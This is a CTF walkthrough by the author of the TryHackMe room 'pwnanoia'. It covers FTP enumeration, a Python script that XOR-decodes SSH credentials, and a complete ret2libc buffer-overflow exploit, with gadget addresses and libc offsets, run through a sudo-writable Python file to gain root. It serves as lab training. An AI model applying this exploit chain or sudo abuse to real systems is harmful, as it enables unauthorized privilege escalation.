This write-up / walkthrough will provide my full process for finishing my own CTF, the pwnanoia CTF

here is the link of the CTF : https://tryhackme.com/jr/pwnanoia

First, we start by modifying `/etc/hosts` to associate the IP address with the host.

<img width="697" height="65" alt="Pasted image 20251221010544" src="https://github.com/user-attachments/assets/e61062e4-6be2-4d4f-b0ee-d733cdbe4e08" />

We then proceed to take a look at the website.
<img width="1865" height="1006" alt="Pasted image 20251221010605" src="https://github.com/user-attachments/assets/e646be52-938d-469e-977f-4995e2e9f276" />


It seems to be some kind of strange cult using this server. Let’s move on to a port scan with nmap
<img width="1058" height="289" alt="Pasted image 20251221010745" src="https://github.com/user-attachments/assets/93b80a24-06d5-4538-b679-9dac2dc91419" />

We now know that an FTP service is running. Let’s try to connect to it using the username anonymous
<img width="1896" height="908" alt="Pasted image 20251221011024" src="https://github.com/user-attachments/assets/8a92d7eb-aaa4-4918-97ec-6080260bb6d5" />


We find a `.txt` file named **announcement**, which explains that a subdomain called `ascend.thecult.thm` exists. Let’s modify our `/etc/hosts` file again to see where this subdomain leads us.
<img width="765" height="90" alt="Pasted image 20251221011300" src="https://github.com/user-attachments/assets/b6605ed1-6591-4457-a36b-af53380593b5" />



We find three pages on the website:

A main page:

<img width="1865" height="994" alt="Pasted image 20251221011335" src="https://github.com/user-attachments/assets/d2a6a7de-c812-42da-a4e1-27c55ab33814" />

A privacy page, explaining how adepts need to protect themselves:

<img width="1796" height="926" alt="Pasted image 20251221011706" src="https://github.com/user-attachments/assets/7eeb755a-f780-4582-9417-2883862edd65" />


And a final page: the archive page, simulating a shell, containing a `creds.txt` file.

<img width="1835" height="970" alt="Pasted image 20251221011742" src="https://github.com/user-attachments/assets/3dacbbc4-da9a-46dd-98ba-cb8bcf487848" />

The `creds.txt` file gives us the following:

```
KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313
KEY1 ^ 2 = 5fecb164e51b118318d221ac21215fc424d3d738c492aaf8f019
KEY2 ^ 3 = d6398b781a61255339a352ff4aeeca89f1d1cfb3958bcc98ae0a
USER ^ KEY1 ^ KEY2 ^ KEY3 = 0382552b479e62fd365911a2402123836de5653e80b0a726e971199f5a3c11
```

The `^` symbol is used to describe XOR. We now know that the **USER** value is a string XORed with **KEY1**, **KEY2**, and **KEY3**.

We also know that XOR is commutative, which means that if we know one key, we can find the others. Since we already know **KEY1**, we can retrieve **KEY2**. With **KEY2**, we can retrieve **KEY3**, and finally, with all keys, we can recover the user.

Let’s put this into practice using Python and execute the following script:

 ```python
 from pwn import *

key1 = bytes.fromhex("a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313")

key1_2 = "5fecb164e51b118318d221ac21215fc424d3d738c492aaf8f019"
key2_3 = "d6398b781a61255339a352ff4aeeca89f1d1cfb3958bcc98ae0a"
flag_key123 = "0382552b479e62fd365911a2402123836de5653e80b0a726e971199f5a3c11"

key2 = xor(bytes.fromhex(key1_2), key1)
key3 = xor(bytes.fromhex(key2_3), key2)
key1_2_3 = xor(bytes.fromhex(key1_2), key3)

flag = xor(bytes.fromhex(flag_key123), key1_2_3)

print(flag.decode())

 ```
<img width="918" height="571" alt="Pasted image 20251221013441" src="https://github.com/user-attachments/assets/9b8279c3-9eca-4189-8392-13af4003f161" />

Perfect! We now have the SSH credentials for a user named **adept**. Let’s log in to this account.

<img width="764" height="896" alt="Pasted image 20251221013609" src="https://github.com/user-attachments/assets/8ef72e0a-5c6c-4496-89b8-e18d87891bca" />


Once connected via SSH, we find the user flag, a Python file, and an ELF binary. Let’s check our sudo permissions.

<img width="1335" height="193" alt="Pasted image 20251221013825" src="https://github.com/user-attachments/assets/0225b6e6-7021-46a8-b9d4-304de031495e" />

Good. We now know that we can run `file.py` using **sudo** with Python, and that we can edit `file.py` using **nano**. Let’s run **checksec** on the ELF binary.

<img width="1375" height="398" alt="Pasted image 20251221013947" src="https://github.com/user-attachments/assets/891b8687-19b4-40c4-ae00-9c44905bc18d" />


NX is enabled and it is a 64-bit ELF. We are going to attempt a **ret2libc** attack in order to execute `/bin/sh` with sudo, which will give us a root shell.

First, we find the libc base address.

<img width="830" height="91" alt="Pasted image 20251221014406" src="https://github.com/user-attachments/assets/3a243edd-c2eb-4870-9319-a8399affd4ba" />

Then the `system` address:
<img width="830" height="91" alt="Pasted image 20251221014411" src="https://github.com/user-attachments/assets/cba73bf7-2dfd-495b-8d3e-80685207a858" />


The `/bin/sh` address:
<img width="983" height="90" alt="Pasted image 20251221014431" src="https://github.com/user-attachments/assets/82dede33-4360-4507-bd53-87a5abeb9ffe" />


A `pop rdi` gadget:
<img width="930" height="47" alt="Pasted image 20251221014451" src="https://github.com/user-attachments/assets/9eb4a8b5-2d0a-4cd0-9959-39a41e4abf6a" />


And finally, a `ret` gadget:
<img width="766" height="70" alt="Pasted image 20251221014514" src="https://github.com/user-attachments/assets/aea4e503-424a-4809-9aaa-5f6edd3daff7" />

```
...
0x000000000040101a : ret
...
```

Now we just need to assemble everything into an exploit and write it into `file.py` using sudo.

```python
#!/usr/bin/env python3  
from pwn import *  
  
p = process('./usr-verif')  
  
libc_base = 0x00007ffff7dcf000  
system = libc_base + 0x52290  
binsh = libc_base + 0x1b45bd  
  
POP_RDI = 0x0000000000401203  
RET     = 0x000000000040101a  
print(cyclic(200))  
  
payload  = b"A" * 72  
payload += p64(POP_RDI)  
payload += p64(binsh)  
payload += p64(RET)     
payload += p64(system)  
p.clean()  
p.sendline(payload)  
p.interactive()

```

Now let’s execute our exploit.

<img width="642" height="231" alt="Pasted image 20251221022426" src="https://github.com/user-attachments/assets/02da5f22-8ffc-445e-9a15-e3c85bfee39d" />

And… we’re root!  
All that’s left is to retrieve the root flag from the `/root` directory  the CTF is complete! 
